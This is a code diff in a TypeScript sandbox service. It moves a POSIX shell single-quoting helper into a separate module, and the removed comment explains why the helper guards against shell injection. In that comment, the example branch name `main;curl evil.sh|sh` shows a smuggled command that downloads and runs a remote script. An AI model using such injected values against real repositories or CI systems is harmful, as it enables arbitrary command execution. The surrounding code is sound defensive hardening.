@@ -11,6 +11,7 @@ import {
     SandboxRunResult,
 } from '@libs/code-review/domain/contracts/sandbox.provider';
 import { RemoteCommands } from './collectCrossFileContexts.service';
+import { shSingleQuote } from './shell-quote';
 
 const SANDBOX_TIMEOUT_MS = 20 * 60 * 1000; // 20 minutes — cross-file context + file analysis
 const REPO_DIR = '/home/user/repo';
@@ -23,16 +24,6 @@ const TIMEOUTS = {
     COMMAND_LONG_MS: 30_000,
     COMMAND_SHORT_MS: 10_000,
 };
-
-/**
- * Wrap a value in single quotes for safe inclusion in a POSIX shell command.
- * Git ref names (and fork-controlled URLs) can contain characters the shell
- * treats as control tokens — `;`, `&&`, `|`, `$()` — so a branch named
- * `main;curl evil.sh|sh` would otherwise execute arbitrary commands inside
- * the sandbox. Escape any embedded apostrophes using the `'\''` idiom.
- */
-const shSingleQuote = (value: string): string =>
-    `'${value.replace(/'/g, "'\\''")}'`;
 
 @Injectable()
 export class E2BSandboxService implements ISandboxProvider {
